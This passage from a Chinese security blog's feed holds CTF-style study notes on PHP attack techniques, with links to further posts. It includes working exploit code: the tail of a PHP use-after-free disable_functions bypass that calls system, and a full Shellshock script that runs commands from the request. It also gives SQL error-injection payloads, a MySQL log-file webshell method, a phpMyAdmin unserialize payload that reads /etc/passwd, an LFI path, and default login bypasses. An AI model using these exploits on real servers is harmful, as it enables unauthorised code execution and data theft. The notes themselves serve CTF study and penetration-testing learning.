class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在可以连接的情况下，将poc上传到<code>/tmp/</code> 目录下，然后包含他。</p><p>比如 GKCTF2020 Checkin ，GYCTF2020 EasyThink也是 一样的bypass思路。先是<code>Ginkgo=eval($_POST[1]);</code> 然后AS连上后，在<code>/tmp/</code>目录上上传exp。</p><p>![][<a href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200526231323.png]">https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200526231323.png]</a></p><h4 id="LD-PRELOAD-劫持"><a href="#LD-PRELOAD-劫持" class="headerlink" title="LD_PRELOAD 劫持"></a>LD_PRELOAD 劫持</h4><blockquote><p>利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so</p></blockquote><h4 id="ImageMagick-vuln-bypass"><a href="#ImageMagick-vuln-bypass" class="headerlink" title="ImageMagick vuln bypass"></a>ImageMagick vuln bypass</h4><p>也就是<strong>利用存在漏洞的组件，扩展。</strong></p><h4 id="Mod-cgi"><a href="#Mod-cgi" class="headerlink" title="Mod_cgi"></a>Mod_cgi</h4><blockquote><p>修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制（让特定扩展名的文件直接和php-cgi通i信</p></blockquote><h4 id="Windows-系统组件-COM"><a href="#Windows-系统组件-COM" class="headerlink" title="Windows 系统组件 COM"></a>Windows 系统组件 COM</h4><p>在<code>c:/System32/</code> 下的一个<code>wshom.ocx</code> 文件。</p><h4 id="PHP-7-4-FFI-Bypass"><a href="#PHP-7-4-FFI-Bypass" class="headerlink" title="PHP 7.4 FFI Bypass"></a>PHP 7.4 FFI Bypass</h4><blockquote><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。</p></blockquote><p>当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p><p>也就是说，通过PHP调用C的命令执行函数来绕过。</p><p>需要满足：</p><ol><li><code>opcache.preload</code> 启用. (指定将在服务器启动时编译和执行的PHP文件，文件中定义的所有函数和大多数类都将永久加载到 PHP 的函数和类表中，并在将来的任何请求的上下文中永久可用)。</li><li><code>FFI support = enable</code>。</li></ol><p>例题：[RCTF 2019]Nextphp</p><p><a href="https://hack-for.fun/posts/38da.html">https://hack-for.fun/posts/38da.html</a></p><p>![][<a href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200527134039.png]">https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200527134039.png]</a></p><p>![][<a href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200526231206.png]">https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200526231206.png]</a></p><p><a href="https://www.php.net/manual/en/ffi.examples-basic.php">https://www.php.net/manual/en/ffi.examples-basic.php</a></p><p><a href="https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/#0x04-PHP-7-4-FFI">https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/#0x04-PHP-7-4-FFI</a></p><h4 id="Bash-ShellShock"><a href="#Bash-ShellShock" class="headerlink" title="Bash ShellShock"></a>Bash ShellShock</h4><p>利用方法的前提是目标 OS 存在 Bash破壳（CVE-2014-6271）漏洞，该漏洞的具体介绍可参考: <a href="https://www.freebuf.com/news/48331.html">破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之一</a></p><p>![][<a href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200527135528.png]">https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200527135528.png]</a></p><p><strong>Bash 破壳漏洞成因</strong>：目前的 Bash 使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以 <code>()&#123;</code> 开头定义的环境变量在命令 ENV 中解析成函数后，Bash 执行并未退出，而是继续解析并执行 shell 命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><p>好像AntSword 虚拟终端已经将这个漏洞作为默认使用了。</p><p>EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">?php </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params">$cmd</span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   $tmp = tempnam(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>); </span><br><span class="line">   putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   mail(<span class="string">&quot;a@127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;-bv&quot;</span>); <span class="comment">// -bv so we don&#x27;t actuallysend any mail </span></span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> $output; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">&quot;cmd&quot;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="寻找漏网之鱼"><a href="#寻找漏网之鱼" class="headerlink" title="寻找漏网之鱼"></a>寻找漏网之鱼</h4><p>…自行领会。</p><hr><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/paper/readme.old.md">https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/paper/readme.old.md</a></p><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p><p><a href="https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/">https://3nd.xyz/2019/11/06/Memo/bypass-disable-functions/</a></p><p><a href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/">https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/</a></p><h2 id="XXE-PHP-7-0-30"><a href="#XXE-PHP-7-0-30" class="headerlink" title="XXE - PHP 7.0.30"></a>XXE - PHP 7.0.30</h2><ul><li>Php 7.0.30</li><li>Libxml 2.8.0</li></ul><p><strong>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。</strong></p><ul><li>SimpleXMLElement</li><li>loadXML</li><li>simplexml_load_string</li></ul><h2 id="unserialize-serialize"><a href="#unserialize-serialize" class="headerlink" title="unserialize/serialize"></a>unserialize/serialize</h2><ul><li><p>php 7.1.x～7.3.x（具体不知，php7.x 好像都可以，遇到时，试一下就可以。</p><p>对属性类型不敏感，可直接将属性改为public，减轻编写payload的负担。</p></li><li><p>php &lt; 5.6.25 &amp;&amp; php &lt; 7.0.10</p></li></ul><p><code>__wakeup</code> 可绕过。绕过方法：当对象属性个数大于真实属性个数时。</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>不同版本的mysql 主要在”高级“ 注入情况下，</p><p><a href="https://xz.aliyun.com/t/7169#toc-3">https://xz.aliyun.com/t/7169#toc-3</a> 。 膜一波Yunen师傅。</p><h3 id="Mysql-lt-5-0-面试常问"><a href="#Mysql-lt-5-0-面试常问" class="headerlink" title="Mysql &lt; 5.0(面试常问)"></a>Mysql &lt; 5.0(面试常问)</h3><p>由于mysql的低版本缺乏系统库<strong>information_schema</strong>，故通常情况下，我们无法直接查询表名，字段(列)名等信息，这时候只能靠<strong>猜</strong>来解决。</p><p>直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。</p><p>若知道仅表名而不知道列(字段)名：</p><p>可通过以下payload：</p><ul><li>若多字段：select <code>x</code> from(select 1,2,3,4,xxx from table_name union select * from table_name)a</li><li>若单字段：select *,1,2,xxx from table_name</li></ul><h3 id="Mysql-gt-5-0（面试常问"><a href="#Mysql-gt-5-0（面试常问" class="headerlink" title="Mysql &gt;= 5.0（面试常问"></a>Mysql &gt;= 5.0（面试常问</h3><p>首先去一个名为<strong>information_schema</strong>的数据库里的<strong>shemata</strong>数据表查询<strong>全部数据库名</strong>。</p><p>若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名。</p><p>在information_schema的一个名为<strong>tables</strong>的数据表中存着全部的<strong>数据表信息</strong>。</p><p>其中，<strong>table_name 字段保存其名称</strong>，<strong>table_schema保存其对应的数据库名</strong>。</p><p>接着通过其表名，查询该表的所有字段名，有时也称列名。</p><p>通过information_schema库下的<strong>columns</strong>表可查询对应的数据库/数据库表含有的字段名。</p><blockquote><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表<br>名；5.0以下是多用户单操作，5.0以上是多用户多操做。</p></blockquote><h3 id="exp-pow-报错注入"><a href="#exp-pow-报错注入" class="headerlink" title="exp()/pow() 报错注入"></a>exp()/pow() 报错注入</h3><p>Mysql 5.5.5~5.5.49</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select exp(3);</span><br><span class="line">+--------------------+</span><br><span class="line">| exp(3)             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 20.085536923187668 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.04 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; select exp(999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(999)&#39;</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select pow(9,99);</span><br><span class="line">+-----------------------+</span><br><span class="line">| pow(9,99)             |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 2.9512665430652752e94 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; select pow(9,999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(9,999)&#39;</span><br></pre></td></tr></table></figure><h3 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml() 报错注入"></a>updatexml() 报错注入</h3><p>Mysql 5.1.5+</p><p>与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。</p><p>payload: <code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p><p>前后添加~使其不符合xpath格式从而报错。</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>函数语法：<code>EXTRACTVALUE (XML_document, XPath_string);</code></p><p>适用版本：5.1.5+</p><p>利用原理与updatexml函数相同</p><p>payload: <code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><ul><li><code>file_priv</code> 用户的文件读写权限。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select file_priv from mysql.user where user&#x3D;$USER host&#x3D;$HOST;</span><br></pre></td></tr></table></figure><ul><li><pre><code>secure-file-priv<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  系统变量，对文件读&#x2F;写功能进行限制</span><br><span class="line"></span><br><span class="line">  - 无内容，表示无限制。</span><br><span class="line">  - 为NULL，表示禁止文件读&#x2F;写。</span><br><span class="line">  - 为目录名，表示仅允许对特定目录的文件进行读&#x2F;写。</span><br><span class="line"></span><br><span class="line">mysql 5.5.53 本身及以后的版本默认值为NULL，之前的版本无内容。</span><br><span class="line"></span><br><span class="line">查看当前的&#96;secure-file-priv&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sql</span><br><span class="line">select @@secure_file_priv;</span><br><span class="line">select @@global.secure_file_priv;</span><br><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure></code></pre></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select @@secure_file_priv;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| @@secure_file_priv |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| NULL               |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MySQL [(<span class="keyword">none</span>)]&gt; <span class="keyword">select</span> <span class="keyword">version</span>();</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| version()  |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| 5.6.46-log |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为<code>NULL</code>，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。</p><p>如果上面不行，就可以用日志进行攻击。（面试经常会问道。</p><p>mysql日志文件的一些相关设置可以直接通过命令来进行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//请求日志</span><br><span class="line">mysql&gt; set global general_log_file = &#x27;/var/www/html/1.php&#x27;;</span><br><span class="line">mysql&gt; set global general_log = on;</span><br><span class="line">//慢查询日志</span><br><span class="line">mysql&gt; set global slow_query_log_file=&#x27;/var/www/html/2.php&#x27;</span><br><span class="line">mysql&gt; set global slow_query_log=1;</span><br><span class="line">//还有其他很多日志都可以进行利用</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>之后我们在让数据库执行满足记录条件的恶意语句即可。</p><p>限制：</p><ul><li>权限够，可以进行日志的设置操作</li><li>知道目标目录的绝对路径</li></ul><h3 id="堆叠注入Stack-Injection"><a href="#堆叠注入Stack-Injection" class="headerlink" title="堆叠注入Stack Injection"></a>堆叠注入Stack Injection</h3><p>PHP中堆叠注入的支持情况：</p><table><thead><tr><th align="left"></th><th align="left">Mysqli</th><th align="left">PDO</th><th align="left">MySQL</th></tr></thead><tbody><tr><td align="left">引入的PHP版本</td><td align="left">5.0</td><td align="left">5.0</td><td align="left">3.0之前</td></tr><tr><td align="left">PHP5.x是否包含</td><td align="left">是</td><td align="left">是</td><td align="left">是</td></tr><tr><td align="left">多语句执行支持情况</td><td align="left">是</td><td align="left">大多数</td><td align="left">否</td></tr></tbody></table><h1 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h1><ul><li>phpmyadmin2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。<ul><li>漏洞危害：无需登录，任意代码执行，任意文件读取</li><li>Payload: <code>action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</code></li></ul></li></ul><p>/scripts/setup.php</p><p><a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md</a></p><p><a href="https://hack-for.fun/posts/d68d.html">https://hack-for.fun/posts/d68d.html</a></p><ul><li>Phpmyadmin <strong>4.0.x – 4.6.2</strong> RCE</li></ul><p><a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2016-5734/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2016-5734/README.zh-cn.md</a></p><p><a href="https://hack-for.fun/posts/8b82.html">https://hack-for.fun/posts/8b82.html</a></p><ul><li>Phpmyadmin<strong>4.8.1</strong> RFI</li></ul><p><a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md</a></p><p><a href="https://hack-for.fun/posts/ef94.html">https://hack-for.fun/posts/ef94.html</a></p><p>通过写入session, 然后包含session 文件进行getshell。</p><p>Payload:<code>index.php?target=db_sql.php%253f../../../../../tmp/sess_619cd5b47fc730f60a757f19ce6ea268</code></p><ul><li>phpmyadmin 通用密码漏洞</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">默认 phpMyAdmin：用户名 root、密码 root 或空登陆。</span><br><span class="line"></span><br><span class="line">版本 2.11.3～2.11.4：用户名 &#39;localhost&#39;@&#39;@&quot; 登陆，无需密码。</span><br><span class="line"></span><br><span class="line">版本 2.11.9.2：用户名 root 登陆，无需密码。</span><br></pre></td></tr></table></figure><ul><li>其他版本漏洞</li></ul><p><a href="https://blog.csdn.net/aiquan9342/article/details/102075632">https://blog.csdn.net/aiquan9342/article/details/102075632</a></p><p>一： 影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG</p><blockquote><p>　　概述：PhpMyAdmin存在PREG<em>REPLACE</em>EVAL漏洞</p><p>　　利用模块：exploit/multi/http/phpmyadmin<em>preg</em>replace CVE: CVE-2013-3238</p></blockquote><p>二： 影响版本：phpMyAdmin v3.5.2.2</p><blockquote><p>　　概述：PhpMyAdmin存在server<em>sync.php 后门漏洞</em></p><p>　　<em>利用模块：exploit/multi/http/phpmyadmin</em>3522_backdoor CVE: CVE-2012-5159</p></blockquote><p>三： 影响版本： 2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1;</p><blockquote><p>　　概述：PhpMyAdmin配置文件/config/config.inc.php存在命令执行</p><p>　　利用模块：exploit/unix/webapp/phpmyadmin_config CVE: CVE-2009-1151</p></blockquote><p>四:影响版本：2.11.3 / 2.11.4</p><blockquote><p>　　利用方法：用户名处写入‘localhost’@‘@”则登录成功。 (注意全部是英文标点符号，最后一个为英文双引号)</p></blockquote><p>五:影响版本：2.8.0.3</p><p>　　phpmyadmin配合phpinfo getshell</p><p>　　<a href="https://www.t00ls.net/thread-37889-1-1.html">https://www.t00ls.net/thread-37889-1-1.html</a></p><p>附上几个php爆绝对路径的办法：</p><blockquote><p>phpMyAdmin/libraries/select<em>lang.lib.php</em></p><p><em>phpMyAdmin/darkblue</em>orange/layout.inc.php phpMyAdmin/index.php?lang[]=1</p><p>phpmyadmin/themes/darkblue_orange/layout.inc.php</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>特性很多，一篇文章肯定总结不过来。不过能总结一些还是好的，至少能够更加熟练。更重要的是，养成总结的习惯。</p><blockquote><p>不定期补充。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一直觉得自己对相关的漏洞学的马马虎虎，没有深入总结，最近几次CTF比赛中也吃了不少的亏。遂想花一两天的时间来好好总结一下各个版本之间的区别，</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="PHP安全" scheme="https://hack-for.fun/tags/PHP%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP CVE、ThinkPHP、PhpMyAdmin、PHP 安全学习笔记</title>
    <link href="https://hack-for.fun/56cfbe5.html"/>
    <id>https://hack-for.fun/56cfbe5.html</id>
    <published>2020-08-25T15:48:53.000Z</published>
    <updated>2020-08-25T16:11:38.553Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="f2742063f6d394c384849d7299bcb5db0f7c3d4b2c832430b72479b86dd6774b"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    
    <category term="PHP安全" scheme="https://hack-for.fun/tags/PHP%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
